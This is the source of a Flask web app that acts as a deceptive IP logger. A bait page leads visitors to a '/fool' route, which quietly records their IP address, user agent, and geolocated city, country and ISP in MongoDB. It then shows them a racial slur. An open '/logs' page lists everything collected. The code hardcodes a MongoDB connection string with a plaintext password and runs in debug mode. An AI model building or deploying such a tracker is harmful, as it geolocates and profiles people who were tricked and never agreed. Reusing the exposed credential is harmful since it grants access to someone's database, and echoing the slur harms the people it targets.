from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import pytz
from pymongo import MongoClient

app = Flask(__name__)

# 🔹 MongoDB Connection
client = MongoClient("mongodb+srv://prathamdesai786_db_user:Shelby@1980@cluster0.h5mgcpd.mongodb.net/?appName=Cluster0")
db = client["iplogger"]
collection = db["logs"]


# 🔹 Get Real IP (handles proxies like Render)
def get_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr


# 🔹 Get IST Time
def get_time():
    ist = pytz.timezone('Asia/Kolkata')
    return datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")


# 🔹 Consent Page
@app.route('/spills')
def consent_page():
    return render_template_string("""
        <h2>Do you want to know about the owner of spills ?</h2>
        <a href="/fool"><button>Yes</button></a>
    """)


# 🔹 Data Collection
@app.route('/fool')
def collect_data():
    ip = get_ip()
    user_agent = request.headers.get('User-Agent')
    timestamp = get_time()

    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        data = response.json()

        city = data.get("city", "N/A")
        country = data.get("country_name", "N/A")
        isp = data.get("org", "N/A")

        print("API RESPONSE:", data)

    except Exception as e:
        print("API ERROR:", e)
        city, country, isp = "N/A", "N/A", "N/A"

    # 🔹 Store in MongoDB
    collection.insert_one({
        "ip": ip,
        "user_agent": user_agent,
        "city": city,
        "country": country,
        "isp": isp,
        "timestamp": timestamp
    })

    return """
        <h2>You were fooled my NIGGA !!</h2>
    """


# 🔹 View Logs
@app.route('/logs')
def view_logs():
    data = collection.find()

    table = """
    <h2>Collected Logs</h2>
    <table border='1'>
    <tr>
        <th>IP</th>
        <th>User-Agent</th>
        <th>City</th>
        <th>Country</th>
        <th>ISP</th>
        <th>Timestamp</th>
    </tr>
    """

    for row in data:
        table += f"""
        <tr>
            <td>{row.get('ip')}</td>
            <td>{row.get('user_agent')}</td>
            <td>{row.get('city')}</td>
            <td>{row.get('country')}</td>
            <td>{row.get('isp')}</td>
            <td>{row.get('timestamp')}</td>
        </tr>
        """

    table += "</table>"
    return table


if __name__ == '__main__':
    app.run(debug=True)
